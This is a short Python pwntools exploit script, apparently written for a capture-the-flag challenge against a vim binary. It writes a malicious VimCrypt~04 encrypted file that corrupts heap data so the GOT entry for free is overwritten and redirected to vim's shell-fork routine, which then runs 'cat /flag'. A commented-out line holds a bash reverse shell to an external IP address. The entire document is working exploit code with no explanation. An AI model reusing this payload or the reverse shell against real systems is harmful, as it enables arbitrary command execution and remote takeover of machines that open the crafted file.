from pwn import *
elf=ELF("./vim")
f={
        0:"VimCrypt~04!",
        12:p32(0xffffffff^0x61)[::-1],
        0x10:"a"*0x15+p64(elf.got["free"] - 0x30 - 0x15)[::-1]+"\x00", #+p64(0xffffffe0000000f1)[::-1]+p64(0x000000f0ffffffff)[::-1]+p64(0x20000000200)[::-1],
        0x10+0x15+9:
        # 
        (p64(elf.got["free"]-0x30)+"a"*0x14+
            #"bash -i >& /dev/tcp/47.52.106.161/999 0>&1\x00".ljust(0x30,"\x00")+
            "cat /flag\x00".ljust(0x30,"\x00")+
            p64(elf.sym["mch_call_shell_fork"])+p64(elf.sym["_IO_getc"])+p64(elf.sym["atan"]+6)+p64(elf.sym["strlen"]+6)+
            p64(elf.sym["ferror"]+6)
            ).ljust(0x7c,"\xbb")[::-1]

    
    }
with open("./exp","w+") as fp:
    fp.write(fit(f,filler="\xaa",length=0x102))
